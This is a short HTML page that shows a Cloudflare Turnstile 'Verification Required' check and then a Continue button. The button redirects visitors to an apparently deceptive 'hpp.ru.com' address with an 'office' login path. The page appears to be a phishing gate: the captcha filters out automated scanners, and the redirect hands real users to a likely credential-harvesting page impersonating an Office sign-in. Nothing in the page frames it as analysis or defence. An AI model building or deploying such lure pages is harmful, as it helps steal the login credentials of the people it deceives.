<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verification</title>

  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>

  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #74ebd5, #ACB6E5);
      color: white;
      text-align: center;
    }

    .box {
      background: rgba(0,0,0,0.25);
      padding: 25px;
      border-radius: 12px;
      width: 300px;
    }

    .hidden {
      display: none;
    }

    button {
      margin-top: 15px;
      padding: 10px 15px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-weight: bold;
    }
  </style>

  <script>
    function verified() {
      document.getElementById("captchaBox").classList.add("hidden");
      document.getElementById("successBox").classList.remove("hidden");
    }

    function continueToSite() {
      window.location.href = "https://hpp.ru.com/form/signed_secured/office";
    }
  </script>
</head>

<body>

  <!-- CAPTCHA BOX -->
  <div class="box" id="captchaBox">
    <h2>Verification Required</h2>
    <p>Please complete the check to continue</p>

    <div class="cf-turnstile"
         data-sitekey="0x4AAAAAADF0eQcyR9cmfjOy"
         data-callback="verified"></div>
  </div>

  <!-- SUCCESS BOX -->
  <div class="box hidden" id="successBox">
    <h2>Verification Complete</h2>
    <p>You you have to login to continue.</p>

    <button onclick="continueToSite()">Continue</button>
  </div>

</body>
</html>
